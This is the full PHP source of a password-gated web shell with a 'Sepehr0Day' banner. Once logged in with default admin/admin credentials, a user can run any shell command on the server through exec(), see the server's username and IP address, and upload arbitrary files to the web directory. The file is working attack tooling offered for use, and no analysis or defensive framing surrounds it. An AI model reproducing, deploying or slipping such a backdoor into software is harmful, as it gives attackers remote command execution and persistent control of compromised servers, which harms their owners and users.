<?php
session_start();

if (isset($_SESSION['loggedin']) && $_SESSION['loggedin']) {
    $loggedin = true;
} else {
    $loggedin = false;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username']) && isset($_POST['password'])) {
    $valid_username = "admin"; // Change username
    $valid_password = "admin"; // Change password
    $username = $_POST['username'];
    $password = $_POST['password'];

    if ($username === $valid_username && $password === $valid_password) {
        $_SESSION['loggedin'] = true;
        $loggedin = true;
    } else {
        $error = "Invalid username or password.";
    }
}
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['logout'])) {
    session_destroy();
    header("Location: index.php");
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
          integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN"
          crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
            integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
            crossorigin="anonymous"></script>
</head>

<body style="background-color: black !important;">
<div class="container">
    <div class="row justify-content-center mt-5">
        <?php if ($loggedin): ?>
        <div class="col-md-6">
            <div class="card-body">
                <!DOCTYPE html>
                <html lang="en">

                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <link rel="stylesheet"
                          href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
                          integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN"
                          crossorigin="anonymous">
                    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
                            integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
                            crossorigin="anonymous"></script>
                    <link rel="preconnect" href="https://fonts.googleapis.com">
                    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
                    <link href="https://fonts.googleapis.com/css2?family=Whisper&display=swap" rel="stylesheet">
                    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>


                    <style>
                        body {
                            background-color: black !important;
                            color: white;
                            padding: 20px;
                            font-family: Calibri;
                        }


                        #output-container {
                            position: relative;
                        }

                        #server-info {
                            position: absolute;
                            top: 0;
                            right: 0;
                            padding: 10px;
                            background-color: #333;
                            border-radius: 5px;
                            white-space: nowrap;
                        }

                        #header {
                            font-family: 'Whisper', cursive;
                            font-size: 36px;
                            animation: fade 3s infinite;
                        }

                        @keyframes fade {
                            0%, 100% {
                                opacity: 1;
                            }
                            50% {
                                opacity: 0;
                            }
                        }

                        #output {
                            margin-top: 10px;
                            padding: 10px;
                            border-radius: 5px;
                            white-space: pre-wrap;
                        }

                        #clear-button {
                            margin-top: 10px;
                        }

                        .logout {
                            text-align: right;
                            color: red;
                        }
                    </style>
                </head>

                <script>
                    function clearOutput() {
                        document.getElementById("output").style.display = 'none'
                    }
                </script>
                <h2 style="text-align: center;" id="header">Sepehr0Day</h2>

                <div class="container" id="output-container">
                    <br><br><br>
                    <div id="server-info">
                        <?php
                        $username = getenv('USER') ?: getenv('USERNAME');
                        $ip_address = $_SERVER['SERVER_ADDR'];
                        echo '<strong>Username:</strong> ' . htmlspecialchars($username) . '<br>';
                        echo '<strong>IP Address:</strong> ' . htmlspecialchars($ip_address) . '<br>';
                        ?>

                    </div>

                    <div class="logout">
                        <form method="post" action="">
                            <button type="submit" class="btn btn-danger" name="logout">Logout</button>
                        </form>
                    </div>

                    <form name="commandRUN" method="post" action="index.php" onsubmit="clearOutput()">
                        <div class="form-group">
                            <br><br>
                            <input type="text" placeholder="Enter your command:" class="form-control" id="command"
                                   name="command"
                                   required><br>
                            <button type="submit" class="btn btn-primary">Run</button>
                        </div>
                    </form>

                    <?php
                    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST["command"])) {
                        $command = $_POST['command'];
                        $output = '';
                        exec($command, $output, $return_var);
                        echo '<div id="output" style="background-color: ' . ($return_var === 0 ? 'green' : 'red') . ';">';
                        echo '<strong>Command:</strong> ' . htmlspecialchars($command) . '<br>';
                        echo '<strong>Output:</strong><br>';
                        foreach ($output as $line) {
                            echo htmlspecialchars($line) . '<br>';
                        }
                        echo '</div>';
                    }
                    ?>

                    <button id="clear-button" class="btn btn-danger" onclick="clearOutput()">Clear Output</button>
                    <div class="mt-5" id="file-upload-section">
                        <h2 class="text-white">File Upload</h2>

                        <form name="upload" method="post" action="index.php" enctype="multipart/form-data">
                            <div class="form-group">
                                <input type="file" class="form-control" id="file" name="file" required>
                                <button type="submit" class="btn btn-primary mt-2" name="upload">Upload</button>
                            </div>
                        </form>


                        <?php
                        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST["upload"])) {
                            $fileUpload = $_FILES['file'];
                            if ($fileUpload['error'] === UPLOAD_ERR_OK) {
                                $uploadedFilePath = $fileUpload['name'];
                                move_uploaded_file($fileUpload['tmp_name'], $uploadedFilePath);
                                echo '<br><div id="success-alert" class="alert alert-success alert-dismissible fade show" role="alert">
                File uploaded successfully: ' . htmlspecialchars($fileUpload['name']) . '
            </div>
            <script>
                setTimeout(function() {
                    $("#success-alert").fadeOut("slow");
                }, 5000);
            </script>';
                            } elseif ($fileUpload['error'] === UPLOAD_ERR_NO_FILE) {
                                echo '<br><div id="warning-alert" class="alert alert-warning alert-dismissible fade show" role="alert">
                No file selected.
            </div>
            <script>
                setTimeout(function() {
                    $("#warning-alert").fadeOut("slow");
                }, 5000);
            </script>';
                            } else {
                                echo '<br><div id="error-alert" class="alert alert-danger alert-dismissible fade show" role="alert">
                Error uploading the file.
            </div>
            <script>
                setTimeout(function() {
                    $("#error-alert").fadeOut("slow");
                }, 5000);
            </script>';
                            }
                        }
                        ?>
                    </div>
                </div>


            </div>

        </div>
    </div>
    <?php else: ?>
        <div class="col-md-6">
            <div class="card bg-dark text-white">
                <div class="card-header" style="background-color: white; color: black;">
                    Login
                </div>
                <div class="card-body" style="background-color: black;">
                    <?php if (isset($error)): ?>
                        <div class="alert alert-danger" role="alert">
                            <?php echo $error; ?>
                        </div>
                    <?php endif; ?>
                    <form method="post" action="">
                        <div class="mb-3">
                            <label for="username" class="form-label">Username</label>
                            <input type="text" class="form-control" id="username" name="username" required>
                        </div>
                        <div class="mb-3">
                            <label for="password" class="form-label">Password</label>
                            <input type="password" class="form-control" id="password" name="password" required>
                        </div>
                        <button type="submit" class="btn btn-outline-light">Login</button>
                    </form>
                </div>
            </div>
        </div>
    <?php endif; ?>


</div>
</div>
</body>

</html>
